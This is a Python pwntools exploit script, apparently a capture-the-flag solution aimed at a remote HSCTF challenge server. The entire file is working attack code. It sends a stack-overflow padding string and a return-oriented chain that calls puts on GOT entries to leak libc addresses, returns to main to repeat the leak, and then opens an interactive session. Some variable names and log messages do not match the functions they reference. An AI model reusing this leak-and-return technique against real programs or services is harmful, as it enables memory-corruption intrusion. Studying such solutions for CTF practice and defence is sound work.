from pwn import * 

exe = ELF("./ex")
#p = process("./ex")
#gdb.attach(p)
p = remote("ex.hsctf.com", 1337)

context.binary = exe


main = 0x401276
ret = 0x40101a
fgets_got = exe.got["fgets"]
strcpy_got = exe.got["setvbuf"]
puts_plt = exe.plt["puts"]
pop_rdi_ret = 0x4014f3

payload = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ" 
payload += p64(pop_rdi_ret)
payload += p64(fgets_got)
payload += p64(puts_plt)
payload += p64(ret) 
payload += p64(main)
p.sendline(payload)
p.recvline()
p.sendline(b"Q")

recieved1 = p.recvline().strip()
leaked_fgets = u64(recieved1.ljust(8, b"\x00"))
log.success("Leaked libc address, fgets: "+ str(hex(leaked_fgets)))

payload = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ" 
payload += p64(pop_rdi_ret)
payload += p64(strcpy_got)
payload += p64(puts_plt)
payload += p64(ret) 
payload += p64(main)
p.sendline(payload)
p.recvline()
p.sendline(b"Q")

recieved2 = p.recvline().strip()
leaked_fopen = u64(recieved2.ljust(8, b"\x00"))
log.success("Leaked libc address, strcspn: "+ str(hex(leaked_fopen)))


p.interactive()